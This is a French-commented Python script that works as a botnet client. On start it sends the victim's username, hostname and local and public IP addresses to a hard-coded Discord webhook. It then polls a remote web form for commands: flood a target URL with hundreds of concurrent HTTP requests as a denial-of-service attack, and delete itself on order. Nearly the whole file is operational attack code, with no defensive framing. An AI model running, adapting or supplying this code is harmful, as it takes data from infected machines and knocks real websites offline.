import requests
from bs4 import BeautifulSoup
import time

url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"

headers = {
    "User-Agent": "...",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Language": "fr,en;q=0.9",
    "Connection": "keep-alive",
}

import os

webhook = "https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi"

valeur = ""
ip_public = ""
alerte_activée = ""
ip_cible = ""
previous_alerte = None
previous_ip = None

import platform
import getpass
import socket

ordi = platform.uname()
hostname = socket.gethostname()

ip_public = requests.get("https://api.ipify.org").text
name = (
    f"Utilisateur actuel : {getpass.getuser()}\n"
    f"Nom de l'ordinateur : {ordi.node}\n"
    f"Adresse IP : {socket.gethostbyname(hostname)}\n"
    f"Adresse IP publique {ip_public}\n"
    )

requests.post(webhook, json={"content": name})

def envoyer():
    global valeur

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ = soup.find("input", {"id": "monTexte"})

        if champ:
            nouvelle_val = champ.get("value").strip()

            # Si la valeur a changé et n'est pas vide → action
            if nouvelle_val != "":
                valeur = nouvelle_val
                requests.post(webhook, json={"content": f"Valeur trouvée : {valeur}"})
                ddos_attack()

    except Exception as e:
        print("Erreur :", e)


def loop_check():
    while True:
        envoyer()
        alerte()
        time.sleep(20)  # ← 20 secondes

def alerte():
    global previous_alerte, alerte_activée

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ_alerte = soup.find("input", {"id": "alerte"})
        if champ_alerte:
            message_alerte = champ_alerte.get("value").strip()

            if message_alerte != "" and message_alerte != previous_alerte:
                previous_alerte = message_alerte
                alerte_activée = message_alerte
                ip()

    except Exception as e:
        print("Erreur (alerte) :", e)



def ip():
    global ip_public, previous_ip, ip_cible

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ_ip = soup.find("input", {"id": "ip"})
        if champ_ip:
            ip_cible_nouveau = champ_ip.get("value").strip()

            if ip_cible_nouveau != ip_public:
                requests.post(webhook, json={"content": f"L'ip ne correspond pas à l'IP publique : {ip_public}"})
                return

            confirmer(ip_cible_nouveau)

    except Exception as e:
        print("Erreur (ip) :", e)



def confirmer(ip_cible_nouveau):
    global previous_ip, ip_cible

    if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
        previous_ip = ip_cible_nouveau
        ip_cible = ip_cible_nouveau

        try:
            requests.post(webhook, json={"content": f" Botnet détruit à la demande de l'IP cible : {ip_cible}"})
            destroy()
        except ValueError:
            print("IP cible invalide :", ip_cible)


import os
import sys
import subprocess

def destroy():
    script_path = os.path.abspath(sys.argv[0])

    # Pour Windows
    if os.name == "nt":
        subprocess.Popen(
            f'del "{script_path}"',
            shell=True,
        )
    
    # Pour Linux/Mac
    else:
        subprocess.Popen(["rm", script_path])

    sys.exit()

from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp


async def async_ddos_attack():
    global valeur

    nombre_requetes = int(500)
    concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
    
    start_time = time.time()
    
 
    async def envoyer_requete_async(session, num):
        global valeur 
        try:
            async with session.get(valeur, timeout=5) as response:
                if num % 100 == 0 or num < 10:  
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status}")
                return True
        except Exception as e:
            if num % 100 == 0 or num < 10:
                print(f"Erreur requête {num} : {str(e)}")
            return False
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:
        # Créer les tâches
        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]
        
        batch_size = 1000
        successful = 0
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            successful += sum(1 for r in results if r is True)
            
            # Afficher la progression
            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))
            print(f"Progression : {progress}% ({i + len(batch)}/{nombre_requetes})")
    
    duration = time.time() - start_time
    
    temps = f"\nAttaque terminée en {duration:.2f} secondes"
    cible = f"Requêtes réussies : {successful}/{nombre_requetes}"
    vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
    requests.post(webhook, json=temps)
    requests.post(webhook, json=cible)
    requests.post(webhook, json=vitesse)


def ddos_attack():
    global valeur 

    try:
        asyncio.run(async_ddos_attack())
    except ImportError:
        print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")

        nombre_requetes = int(500)
        max_workers = min(10000, nombre_requetes)
        
        start_time = time.time()
        success_count = 0
        
        def envoyer_requete(num):
            global valeur 
            try:
                response = requests.get(valeur, timeout=5)
                if num % 50 == 0 or num < 5:
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status_code}")
                return True
            except Exception as e:
                if num % 50 == 0 or num < 5:
                    print(f"Erreur requête {num} : {str(e)}")
                return False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(envoyer_requete, i+1) for i in range(nombre_requetes)]
            
            for i, future in enumerate(futures):
                try:
                    if future.result():
                        success_count += 1
                except Exception:
                    pass
                
                if (i+1) % 100 == 0:
                    print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
        
        duration = time.time() - start_time
        
        temps = f"\nAttaque terminée en {duration:.2f} secondes"
        cible = f"Requêtes réussies : {success_count}/{nombre_requetes}"
        vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
        requests.post(webhook, json=temps)
        requests.post(webhook, json=cible)
        requests.post(webhook, json=vitesse)



# Appel de la fonction
loop_check()
